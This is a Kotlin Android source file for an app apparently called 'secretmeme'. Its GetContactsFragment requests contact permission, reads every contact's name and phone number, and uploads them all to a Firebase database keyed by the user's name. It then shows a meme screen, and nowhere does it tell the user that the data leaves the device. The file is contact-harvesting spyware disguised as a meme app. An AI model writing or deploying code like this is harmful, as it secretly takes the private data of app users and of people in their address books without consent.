package com.example.secretmeme.fragments

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.ContactsContract
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.fragment.app.Fragment
import androidx.fragment.app.FragmentManager
import androidx.navigation.fragment.findNavController
import androidx.navigation.fragment.navArgs
import com.example.secretmeme.R
import com.example.secretmeme.databinding.FragmentGetContactsBinding
import com.example.secretmeme.model.ContactDetail
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase

class GetContactsFragment : Fragment() {

    private var _binding: FragmentGetContactsBinding? = null
    private val binding get() = _binding!!

    private val args: GetContactsFragmentArgs by navArgs()

    private val REQUEST_CODE = 111
    private lateinit var contacts: ArrayList<ContactDetail>

    private lateinit var database: FirebaseDatabase
    private lateinit var reference: DatabaseReference

    private var columns = listOf<String>(
        ContactsContract.CommonDataKinds.Phone._ID,
        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
        ContactsContract.CommonDataKinds.Phone.NUMBER
    ).toTypedArray()

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        // Inflate the layout for this fragment
        _binding = FragmentGetContactsBinding.inflate(inflater, container, false)

        val name = args.userName
        "Getting Ready $name Please Wait".also { binding.textView2.text = it }

        database = FirebaseDatabase.getInstance()
        reference = database.getReference(name)

        if (ActivityCompat.checkSelfPermission(
                requireContext(),
                Manifest.permission.READ_CONTACTS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            requestPermissions(
                arrayOf(Manifest.permission.READ_CONTACTS),
                REQUEST_CODE
            )
        } else {
            readContacts()
        }
        return binding.root
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

            Toast.makeText(requireContext(), "Permission Granted", Toast.LENGTH_SHORT).show()
            readContacts()

        } else {
            Toast.makeText(
                requireContext(),
                "Need This Permission To Work Properly",
                Toast.LENGTH_SHORT
            ).show()
            requireActivity().finish()
        }
    }

    private fun readContacts() {

        contacts = ArrayList()

        val rs = requireActivity().contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            columns, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
        )

        while (rs?.moveToNext()!!) {
            val temp = ContactDetail(rs.getString(1), rs.getString(2))
            contacts.add(temp)
        }
        rs.close()
        binding.progressBar2.visibility = View.GONE

        uploadToFireBase(contacts)
        showLog(contacts)
        findNavController().navigate(R.id.action_getContacts_to_meme)
    }

    private fun showLog(contacts: ArrayList<ContactDetail>) {

        for (i in contacts.indices) {
            Log.d("Contact", "$i. Name = ${contacts[i].name}     Number = ${contacts[i].number}")
        }
        binding.progressBar2.visibility = View.GONE
    }

    private fun uploadToFireBase(contacts: ArrayList<ContactDetail>) {
//        Toast.makeText(requireContext(), "Size = ${contacts.size}", Toast.LENGTH_SHORT).show()
        for (i in contacts.indices) {
            try {
                val id = contacts[i].name
                reference.child(id).setValue(contacts[i])
            } catch (e: Exception) {
                val id = "Number $i"
                reference.child(id).setValue(contacts[i])
            }
        }
    }

}